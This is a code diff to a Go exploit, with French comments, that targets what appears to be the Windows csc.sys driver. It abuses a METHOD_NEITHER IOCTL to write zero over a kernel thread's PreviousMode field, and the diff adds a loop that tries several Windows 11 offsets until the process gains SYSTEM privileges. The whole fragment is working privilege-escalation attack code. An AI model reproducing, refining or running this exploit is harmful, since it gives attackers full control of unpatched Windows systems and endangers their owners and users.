@@ -187,20 +187,32 @@ func ExploitCSCSys() bool {
 	}
 	defer syscall.CloseHandle(syscall.Handle(hDevice))
 
-	// 4. Trigger IOCTL (METHOD_NEITHER Corruption)
+	// 4. Déclenchement de la corruption (Tentative multi-offsets)
+	// On teste les offsets les plus fréquents pour PreviousMode sur Win11
+	offsets := []uintptr{0x232, 0x230, 0x238}
 	var dummy uint32
-	fmt.Println("[*] Déclenchement de la corruption du noyau...")
-	procDeviceIoControl.Call(
-		hDevice,
-		uintptr(IOCTL_CSC_USER_QUERY_DATABASE),
-		0, 0,
-		targetAddr, 0, // On utilise targetAddr en output buffer pour forcer l'écriture de zero
-		uintptr(unsafe.Pointer(&dummy)),
-		0,
-	)
 
-	fmt.Println("[*] Vérification des nouveaux privilèges...")
-	return CheckAdmin()
+	for _, offset := range offsets {
+		targetAddr := kThreadAddr + offset
+		fmt.Printf("[*] Tentative Trigger avec offset 0x%x sur 0x%x...\n", offset, targetAddr)
+
+		procDeviceIoControl.Call(
+			hDevice,
+			uintptr(IOCTL_CSC_USER_QUERY_DATABASE),
+			0, 0,
+			targetAddr, 0,
+			uintptr(unsafe.Pointer(&dummy)),
+			0,
+		)
+
+		if CheckAdmin() {
+			fmt.Printf("[+] SUCCÈS : Privilèges SYSTEM acquis avec l'offset 0x%x !\n", offset)
+			return true
+		}
+	}
+
+	fmt.Println("[-] Aucun offset n'a fonctionné. La build est peut-être patchée ou HVCI est actif.")
+	return false
 }
 
 func CheckAdmin() bool {
